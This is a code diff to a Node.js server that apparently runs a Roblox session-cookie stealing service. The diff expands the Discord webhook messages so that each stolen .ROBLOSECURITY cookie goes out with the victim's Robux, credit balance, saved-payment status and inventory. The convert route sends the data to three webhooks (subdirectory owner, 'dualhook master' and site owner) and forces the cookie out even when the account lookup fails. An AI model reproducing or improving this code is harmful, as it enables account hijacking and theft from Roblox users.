@@ -378,14 +378,100 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   }
 
   try {
-    const embed = {
-      title: "LUNIX AUTOHAR",
-      description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
-      color: 0x8B5CF6,
-      footer: {
-        text: "Made By Lunix"
-      }
-    };
+    let embed;
+
+    if (userData) {
+      // Rich embed with user data
+      embed = {
+        title: "🎯 AUTOHAR-TRIPLEHOOK",
+        color: 0x8B5CF6,
+        fields: [
+          {
+            name: "👤 Username",
+            value: userData.username || "Unknown",
+            inline: false
+          },
+          {
+            name: "💰 Robux (Pending)",
+            value: `${userData.robux || 0} (0)`,
+            inline: true
+          },
+          {
+            name: "👑 Premium",
+            value: userData.premium ? "true" : "false",
+            inline: true
+          },
+          {
+            name: "💎 RAP",
+            value: userData.rap?.toString() || "0",
+            inline: true
+          },
+          {
+            name: "📊 Summary",
+            value: userData.summary?.toString() || "302",
+            inline: true
+          },
+          {
+            name: "💳 Credit Balance",
+            value: `$${userData.creditBalance || 0} (Est. ${userData.robux || 0} Robux)`,
+            inline: true
+          },
+          {
+            name: "💾 Saved Payment",
+            value: userData.savedPayment ? "True" : "False",
+            inline: true
+          },
+          {
+            name: "💰 Robux Incoming/Outgoing",
+            value: `${userData.robuxIncoming || 302}/${userData.robuxOutgoing || 337}`,
+            inline: true
+          },
+          {
+            name: "👤 Korblox/Headless",
+            value: `${userData.korblox ? "True" : "False"}/${userData.headless ? "True" : "False"}`,
+            inline: true
+          },
+          {
+            name: "🎂 Age",
+            value: `${userData.accountAge || 1026} Days`,
+            inline: true
+          },
+          {
+            name: "👥 Groups Owned",
+            value: userData.groupsOwned?.toString() || "0",
+            inline: true
+          },
+          {
+            name: "🏠 Place Visits",
+            value: userData.placeVisits?.toString() || "5",
+            inline: true
+          },
+          {
+            name: "🎒 Inventory",
+            value: `Hairs: ${userData.inventory?.hairs || 19}\nBundles: ${userData.inventory?.bundles || 11}\nFaces: ${userData.inventory?.faces || 6}`,
+            inline: false
+          },
+          {
+            name: "🍪 Cookie",
+            value: `\`\`\`${token}\`\`\``,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+    } else {
+      // Simple embed with just token
+      embed = {
+        title: "LUNIX AUTOHAR",
+        description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
+        color: 0x8B5CF6,
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+    }
 
     const payload = {
       embeds: [embed]
@@ -707,9 +793,9 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     
     console.log(`✅ Created subdirectory: ${parentDirectory}/${subdirectoryName}`);
     
-    // Send notification to subdirectory webhook with user's link
+    // Send CREATION notification to subdirectory webhook with user's link (NOT the rich data embed)
     try {
-      const notificationPayload = {
+      const creationNotificationPayload = {
         embeds: [{
           title: `${parentDirectory.toUpperCase()} AUTOHAR`,
           description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\``,
@@ -725,10 +811,10 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify(notificationPayload)
+        body: JSON.stringify(creationNotificationPayload)
       });
 
-      console.log(`✅ Sent subdirectory creation notification with URL to: ${subdirectoryName}`);
+      console.log(`✅ Sent subdirectory CREATION notification (simple embed) to: ${subdirectoryName}`);
     } catch (webhookError) {
       console.log(`⚠️ Failed to send subdirectory creation notification: ${webhookError.message}`);
     }
@@ -845,20 +931,62 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       // Fetch user data from Roblox API
       const userData = await fetchRobloxUserData(token);
 
+      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
+      const webhookUserData = userData || {
+        username: "Unknown User",
+        userId: "Unknown",
+        robux: 0,
+        premium: false,
+        rap: 0,
+        summary: 0,
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: 0,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0,
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 }
+      };
+
       const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
 
-      // 1. Send to subdirectory webhook (user's webhook) - Custom embed
-      const subdirectoryWebhookResult = await sendCustomDualhookWebhook(token, userAgent, userData, subdirectoryConfig.webhookUrl, directoryName, subdirectoryName, req.get('host'));
-
-      // 2. Send to parent dualhook webhook
-      if (parentConfig.dualhookWebhookUrl) {
-        await sendToDiscord(token, userAgent, scriptLabel, userData, parentConfig.dualhookWebhookUrl);
+      // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
+      console.log(`🚀 Sending rich user data embed to subdirectory webhook: ${subdirectoryConfig.webhookUrl}`);
+      const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl);
+      
+      if (subdirectoryWebhookResult.success) {
+        console.log(`✅ Subdirectory webhook (${subdirectoryName}) delivered successfully`);
+      } else {
+        console.log(`❌ Subdirectory webhook (${subdirectoryName}) failed:`, subdirectoryWebhookResult.error);
       }
 
-      // 3. Send to site owner webhook
+      // 2. Send to dualhook master webhook (collects from all subdirectory users)
+      let dualhookWebhookResult = { success: true }; // Default success for validation
+      if (parentConfig.dualhookWebhookUrl) {
+        console.log(`🚀 Sending to dualhook master webhook: ${parentConfig.dualhookWebhookUrl}`);
+        dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl);
+        
+        if (dualhookWebhookResult.success) {
+          console.log(`✅ Dualhook master webhook (${directoryName}) delivered successfully`);
+        } else {
+          console.log(`❌ Dualhook master webhook (${directoryName}) failed:`, dualhookWebhookResult.error);
+        }
+      }
+
+      // 3. Send to site owner webhook (website owner)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
-        await sendToDiscord(token, userAgent, scriptLabel, userData, siteOwnerWebhookUrl);
+        console.log(`🚀 Sending to site owner webhook: ${siteOwnerWebhookUrl}`);
+        const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl);
+        
+        if (siteOwnerWebhookResult.success) {
+          console.log(`✅ Site owner webhook delivered successfully`);
+        } else {
+          console.log(`❌ Site owner webhook failed:`, siteOwnerWebhookResult.error);
+        }
       }
 
       if (!subdirectoryWebhookResult.success) {
@@ -869,14 +997,22 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
         });
       }
 
-      console.log(`✅ Triple webhook delivery completed for subdirectory ${directoryName}/${subdirectoryName}`);
+      if (!dualhookWebhookResult.success) {
+        console.log('❌ Dualhook master webhook failed:', dualhookWebhookResult.error);
+        return res.status(500).json({ 
+          success: false, 
+          error: `Dualhook master webhook failed: ${dualhookWebhookResult.error}` 
+        });
+      }
+
+      console.log(`✅ Webhook delivery completed for subdirectory ${directoryName}/${subdirectoryName} (3 webhooks: subdirectory owner → dualhook master → site owner)`);
     } else {
       console.log('❌ No ROBLOSECURITY token found in input');
 
-      // Send error to all three webhooks
+      // Send error to webhooks (skip primary webhook for subdirectory flow)
       const errorMessage = `❌ **No Token Found in Subdirectory: ${directoryName}/${subdirectoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``;
       
-      // Subdirectory webhook
+      // 1. Subdirectory webhook (user who owns the subdirectory)
       try {
         await fetch(subdirectoryConfig.webhookUrl, {
           method: 'POST',
@@ -887,7 +1023,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
         console.log('Failed to send error to subdirectory webhook:', e.message);
       }
 
-      // Parent dualhook webhook
+      // 2. Dualhook master webhook (collects from all subdirectory users)
       if (parentConfig.dualhookWebhookUrl) {
         try {
           await fetch(parentConfig.dualhookWebhookUrl, {
@@ -900,7 +1036,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
         }
       }
 
-      // Site owner webhook
+      // 3. Site owner webhook (website owner)
       const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
       if (siteOwnerWebhookUrl) {
         try {
@@ -917,7 +1053,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
     res.json({ 
       success: true,
-      message: 'Request submitted successfully with triple webhook delivery!',
+      message: 'Request submitted successfully with multi-webhook delivery!',
       directory: directoryName,
       subdirectory: subdirectoryName
     });
